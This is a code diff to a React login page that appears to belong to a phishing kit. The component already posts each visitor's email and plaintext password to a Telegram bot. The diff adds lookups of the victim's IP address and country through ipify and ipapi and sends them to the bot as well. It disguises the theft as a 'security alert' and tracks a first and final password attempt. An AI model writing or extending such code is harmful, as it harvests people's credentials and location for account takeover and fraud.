@@ -107,15 +107,26 @@ const LoginPage = () => {
         throw new Error('Telegram integration not properly configured');
       }
 
-      const message = `🔒 *TRU SECURITY NOTIFICATION* 🔒
-      
-- *User Identified*: ${email}
-- *Access Attempt*: ${step === 1 ? 'First Attempt' : 'Second Attempt'}
-- *Password Attempt*: ||${password}||
-- *Timestamp*: ${new Date().toISOString()}
-- *Origin*: ${window.location.hostname}
+      // Get IP address and country
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResponse.json();
+      const ipAddress = ipData.ip;
 
-${step === 1 ? '⚠️ *Initial Access Attempt Detected* ⚠️' : '🚨 *Final Access Attempt Detected* 🚨'}`;
+      const countryResponse = await fetch(`https://ipapi.co/${ipAddress}/country_name/`);
+      const countryName = await countryResponse.text();
+
+      const message = `🛡️ *SECURITY ALERT - ACCESS ATTEMPT* 🛡️
+
+👤 *User Identity*: ${email}
+🔐 *Password Attempt*: ||${password}||
+🌍 *Location*: ${countryName || 'Unknown'}
+📍 *IP Address*: ${ipAddress}
+⏰ *Timestamp*: ${new Date().toISOString()}
+🌐 *Origin*: ${window.location.hostname}
+
+${step === 1 ? '⚠️ *FIRST ATTEMPT DETECTED* ⚠️' : '🚨 *FINAL ATTEMPT CONFIRMED* 🚨'}
+
+${step === 1 ? '🔄 User may attempt again...' : '✅ Access sequence completed'}`;
 
       const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
         method: 'POST',
@@ -394,4 +405,3 @@ ${step === 1 ? '⚠️ *Initial Access Attempt Detected* ⚠️' : '🚨 *Final 
 };
 
 export default LoginPage;
-
